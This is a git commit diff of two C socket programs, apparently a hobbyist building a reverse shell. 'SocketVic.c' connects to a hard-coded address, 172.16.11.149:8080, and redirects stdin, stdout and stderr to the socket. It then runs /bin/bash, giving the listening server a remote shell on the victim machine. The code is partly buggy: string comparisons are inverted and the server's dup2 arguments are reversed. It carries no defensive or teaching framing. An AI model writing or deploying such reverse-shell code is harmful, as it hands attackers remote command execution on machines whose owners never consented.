d80633977dcfcf4b82607dfba72b3138f3ffa47a
root <root@localhost.localdomain>
2019-10-07 10:02:35 -0400

    something

--- Sockets/SocketServer.c
+++ Sockets/SocketServer.c
@@ -7,52 +7,72 @@
 #define PORT 8080
 
 int main(int argc, char const *argv[]){
+	
+	int sockfd, new_sock;     //the socket file descriptor
+	int opt = 1;
+	struct sockaddr_in address;
+	char buffer[1024] = {0};
+	int bufflen = sizeof(buffer);
+	ssize_t valread;
+	int addrlen = sizeof(address);	
+	//creating the socket
+	//AF_INET says its IP
+	//SOCK_STREAM says it is TCP
+	if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
+		perror("error creating the socket");
+		exit(1);
+	}
+	
+	//making the socket addr and por reuseable.
+	if((setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, 
+					sizeof(opt))) < 0){
+		perror("SetSock");
+		exit(2);
+	}
+	
+	address.sin_family = AF_INET;
+	address.sin_port = htons(PORT);
+	address.sin_addr.s_addr = INADDR_ANY;
+	
+	//attaching(binding) socket with port and address.
+	if((bind(sockfd, (struct sockaddr *) &address, 
+					(socklen_t) addrlen)) < 0){
+		perror("Binding problems");
+		exit(3);
+	}
 
-int sockfd, new_sock;     //the socket file descriptor
-int opt = 1;
-struct sockaddr_in address;
-char buffer[1024] = {0};
-ssize_t valread;
-int addrlen = sizeof(address);
+	//Listening
+	//while(0 < 1){
+		printf("\nGOT HERE1");
+		if((listen(sockfd,3)) < 0){
+			perror("Listen problems");
+			exit(4);
+		}
+		
+		//accepting the connection and making anew socket 
+		//where the data will go through
+		printf("\nGOT HERE2");
+		if((new_sock = accept(sockfd, (struct sockaddr *) &address, 
+						(socklen_t *) &addrlen)) < 0){
+			perror("Accepting connection");
+			exit(5);
+		}
+		
+		printf("\nGOT HERE3");
+		for (int i=0; i<3; i++){
+			dup2(i, new_sock);
+		}
+		//if((valread = recv(new_sock, buffer, 1024, 0)) < 0){
+		//	perror("data unable to be printed\n");
+		//	exit(6);
+		//}
+		//else{
+			//printf("\n%d\n", valread);
+		//	printf("%s\n", buffer);
+		//	memset(buffer, '\0', sizeof(buffer)); //cleaning the buffer
 
-//creating the socket
-if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
-    
-    perror("error creating the socket");
-    exit(1);
-}
+		//}
+	//}
 
-//making the socket addr and por reuseable.
-if(setsockopt(sockfd, SOL_SOCKET, 
-    SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt)) < 0){
-
-    perror("SetSock");
-    exit(2);
-}
-address.sin_family = AF_INET;
-address.sin_port = htons(PORT);
-address.sin_addr.s_addr = INADDR_ANY;
-
-//attaching(binding) socket with port and address.
-if(bind(sockfd, (struct sockaddr *) &address, (socklen_t) addrlen) < 0){
-    perror("Binding problems");
-    exit(3);
-}
-
-//Listening
-if(listen(sockfd,3) < 0){
-
-    perror("Listen problems");
-    exit(4);
-}
-
-if(new_sock = accept(sockfd, (struct sockaddr *) &address, (socklen_t *) &addrlen) < 0){
-    perror("Accepting connection");
-    exit(5);
-}
-
-valread = read(new_sock, buffer, 1024);
-printf("%s\n", buffer);
-
-return 0;
+	return 0;
 }
--- Sockets/SocketVic.c
+++ Sockets/SocketVic.c
@@ -4,41 +4,66 @@
 #include <stdlib.h>
 #include <netinet/in.h>
 #include <string.h>
+#include <unistd.h>
 #define PORT 8080
 
 int main (int argc, char const *argv[]){
-
+	
 	struct sockaddr_in address;
 	int sock = 0, valread; 
 	struct sockaddr_in serv_addr;
-	char *hello = "Hello from client";
+	char *message = malloc(2048);
 	char buffer[1024] = {0};
-
-	//creating the socket
-	if((sock = socket(AF_INET, SOCK_STREAM,0)) < 0){
-		printf("\n Socket creating error \n");
-		return -1;
-
-}
-//filling up temporatly the serv_addr with 0, until we get the actual
-//address
-memset(&serv_addr, '0', sizeof(serv_addr));
-
-serv_addr.sin_family = AF_INET; //USING IP
-serv_addr.sin_port = htons(PORT); //USING PORT, which is 8080
-
-if(inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <=0){
 	
-	printf("\nwrong address\n");
-	return -1;
-}
-
-if(connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0){
-
-	printf("\nConnection Failed \n");
-	return -1;
-}
-
-
+	while(0 < 1){
+		//creating the socket
+		if((sock = socket(AF_INET, SOCK_STREAM,0)) < 0){
+			printf("\n Socket creating error \n");
+			return -1;
+		}
+	
+		//filling up temporatly the serv_addr with 0, until we get the actual
+		//address
+		//memset(&serv_addr, '0', sizeof(serv_addr));
+	
+		serv_addr.sin_family = AF_INET; //USING IP
+		serv_addr.sin_port = htons(PORT); //USING PORT, which is 8080
+	
+		//printf("%d", serv_addr.sin_port);
+		if(inet_pton(AF_INET, "172.16.11.149", &serv_addr.sin_addr) <=0){
 		
+			printf("\nwrong address\n");
+			return -1;
+	
+		}
+
+		if(connect(sock, (struct sockaddr *) &serv_addr, 
+					sizeof(serv_addr)) < 0){
+			printf("\nConnection Failed \n");
+			return -1;
+		}
+
+		//get input from user
+		fgets(message, 1024, stdin);
+		if(!strcmp(message,"stop")){
+			printf("bye!\n");
+			exit(0);
+		}
+
+		else if(strcmp(message,"shell")){
+			printf("GOT HERE\n");
+			for (int i=0; i<3; i++){
+				dup2(sock, i);
+			}
+		
+			execve("/bin/bash", NULL, NULL);
+		}
+
+
+		//else{
+			//send(sock, message, strlen(message), 0);
+			//printf("Message Sent!\n");
+		//}
+	}
+	return 0;
 }
